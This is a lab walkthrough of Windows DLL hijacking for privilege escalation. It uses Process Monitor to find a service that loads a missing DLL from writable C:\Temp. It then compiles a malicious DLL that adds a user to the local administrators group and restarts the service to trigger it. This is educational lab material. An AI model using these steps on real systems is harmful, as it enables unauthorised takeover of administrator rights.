### Detection

Windows VM
```sh
# Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
# In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
# In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.
# In the input box on the same line type: 
> dllhijackservice.exe
# Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
# Next, select from the left-most drop down menu ‘Result’.
# In the input box on the same line type: NAME NOT FOUND
# Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
# Open command prompt and type: 
> sc start dllsvc
# Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.
```


### Exploitation

Windows VM
```sh
# Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.
```

Kali VM
```sh
# Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
# Exit the text editor and compile the file by typing the following in the command prompt: 
> x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
# Copy the generated file hijackme.dll, to the Windows VM.
```

Windows VM
```sh 
# Place hijackme.dll in ‘C:\Temp’.
# Open command prompt and type: 
> sc stop dllsvc & sc start dllsvc
# It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: 
> net localgroup administrators
```